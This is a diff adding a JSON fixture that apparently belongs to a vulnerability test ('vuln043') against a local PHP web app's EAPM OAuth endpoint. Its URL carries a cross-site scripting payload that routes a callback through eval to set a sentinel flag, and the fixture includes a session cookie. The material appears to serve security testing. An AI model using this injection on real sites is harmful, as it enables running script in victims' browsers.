@@ -1,0 +1,1 @@
+{"baseUrl": "http://localhost:33116", "eapmUrl": "http://localhost:33116/index.php?module=EAPM&action=oauth&record=8b3660e9-1541-4c0f-93b6-6e15436b7dfd&oauth_error=1&closeWhenDone=1&callbackFunction=eval&application=top.__vuln043_fired%3Dtrue", "cookieName": "PHPSESSID", "cookieValue": "732c9790516f274b1251ae711635ba2e", "sentinel": "__vuln043_fired"}
